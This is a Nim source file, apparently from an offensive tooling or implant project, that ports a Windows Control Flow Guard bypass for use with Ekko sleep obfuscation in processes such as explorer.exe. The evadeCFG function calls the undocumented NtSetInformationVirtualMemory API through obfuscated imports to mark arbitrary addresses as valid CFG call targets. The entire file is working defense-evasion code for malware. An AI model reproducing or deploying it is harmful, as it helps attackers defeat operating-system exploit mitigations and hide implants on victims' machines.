# This is a Nim-Port of the CFG bypass required for Ekko sleep to work in a CFG enabled process (like rundll32.exe or explorer.exe)
# Original works : https://github.com/ScriptIdiot/sleepmask_ekko_cfg, https://github.com/Crypt0s/Ekko_CFG_Bypass
import winim/lean
import ../../common/utils

type
    CFG_CALL_TARGET_INFO {.pure.} = object
        Offset: ULONG_PTR
        Flags: ULONG_PTR

    VM_INFORMATION {.pure.} = object
        dwNumberOfOffsets: DWORD
        plOutput: ptr ULONG
        ptOffsets: ptr CFG_CALL_TARGET_INFO
        pMustBeZero: PVOID
        pMoarZero: PVOID

    MEMORY_RANGE_ENTRY {.pure.} = object
        VirtualAddress: PVOID
        NumberOfBytes: SIZE_T

    VIRTUAL_MEMORY_INFORMATION_CLASS {.pure.} = enum
        VmPrefetchInformation
        VmPagePriorityInformation
        VmCfgCalltargetInformation
        VmPageDirtyStateInformation

# https://ntdoc.m417z.com/ntsetinformationvirtualmemory
proc NtSetInformationVirtualMemory(hProcess: HANDLE, VmInformationClass: VIRTUAL_MEMORY_INFORMATION_CLASS, NumberOfEntries: ULONG_PTR, virtualAddresses: ptr MEMORY_RANGE_ENTRY, vmInformation: PVOID, VmInformationLength: ULONG): NTSTATUS {.cdecl, stdcall, importc: protect("NtSetInformationVirtualMemory"), dynlib: protect("ntdll.dll").}

# Value taken from: https://www.codemachine.com/downloads/win10.1803/winnt.h
var CFG_CALL_TARGET_VALID = 0x00000001

proc evadeCFG*(address: PVOID): BOOL =
    var dwOutput: ULONG
    var status: NTSTATUS
    var mbi: MEMORY_BASIC_INFORMATION
    var vmInformation: VM_INFORMATION
    var virtualAddresses: MEMORY_RANGE_ENTRY
    var offsetInformation: CFG_CALL_TARGET_INFO
    var size: SIZE_T

    # Get start of region in which function resides 
    size = VirtualQuery(address, addr(mbi), sizeof(mbi))
    
    if size == 0x0:
        return false

    if mbi.State != MEM_COMMIT or mbi.Type != MEM_IMAGE:
        return false

    # Region in which to mark functions as valid CFG call targets
    virtualAddresses.NumberOfBytes = cast[SIZE_T](mbi.RegionSize)
    virtualAddresses.VirtualAddress = cast[PVOID](mbi.BaseAddress)

    # Create an Offset Information for the function that should be marked as valid for CFG
    offsetInformation.Offset = cast[ULONG_PTR](address) - cast[ULONG_PTR](mbi.BaseAddress)
    offsetInformation.Flags = CFG_CALL_TARGET_VALID # CFG_CALL_TARGET_VALID

    # Wrap the offsets into a VM_INFORMATION
    vmInformation.dwNumberOfOffsets = 0x1
    vmInformation.plOutput = addr(dwOutput)
    vmInformation.ptOffsets = addr(offsetInformation)
    vmInformation.pMustBeZero = nil
    vmInformation.pMoarZero = nil

    # Register `address` as a valid call target for CFG
    status = NtSetInformationVirtualMemory(
        GetCurrentProcess(), 
        VmCfgCalltargetInformation, 
        cast[ULONG_PTR](1), 
        addr(virtualAddresses), 
        cast[PVOID](addr(vmInformation)), 
        cast[ULONG](sizeof(vmInformation))
    )

    if status != STATUS_SUCCESS:
        return false 

    return true